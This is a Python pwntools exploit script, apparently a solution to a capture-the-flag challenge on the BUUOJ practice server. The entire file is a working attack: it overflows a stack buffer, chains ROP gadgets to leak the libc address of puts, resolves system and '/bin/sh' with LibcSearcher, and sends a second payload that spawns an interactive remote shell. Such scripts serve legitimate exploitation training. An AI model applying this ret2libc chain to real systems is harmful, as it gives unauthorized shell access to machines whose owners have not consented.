from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF('./espcially_tu_2016')

sh = elf.process()
sh = remote('node3.buuoj.cn', 29887)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
gets_plt = elf.plt['gets']
main = 0x0804851D
pop_ebx = 0x0804839d
mem = 0x0804a000

sh.recvuntil("What's your name?\n")
payload_01 = 'A' * (0x28)
payload_01 += p32(0xdeedbeef)
payload_01 += p32(puts_plt)
payload_01 += p32(pop_ebx)
payload_01 += p32(puts_got)

payload_01 += p32(gets_plt)
payload_01 += p32(pop_ebx)
payload_01 += p32(mem)
payload_01 += p32(main)


sh.sendline(payload_01)

sh.recvuntil("What's your favorite number?\n")

#gdb.attach(sh)

sh.sendline('1')
sh.recvline()
libc_puts = u32(sh.recv()[0:4])
print hex(libc_puts)

libc = LibcSearcher('puts', libc_puts)
libc_base = libc_puts - libc.dump('puts') 
libc_sys = libc_base + libc.dump('system') 
libc_sh = libc_base + libc.dump('str_bin_sh') 

print 'libc_base-----: ' + hex(libc_base)
#sh.recvuntil("What's your name?\n")

payload_01 = 'A' * 0x28
payload_01 += p32(libc_sys)
payload_01 += p32(main)
payload_01 += p32(libc_sh)
#gdb.attach(sh)
sh.sendline(payload_01)
sh.recv()
sh.sendline('1')

sh.interactive()
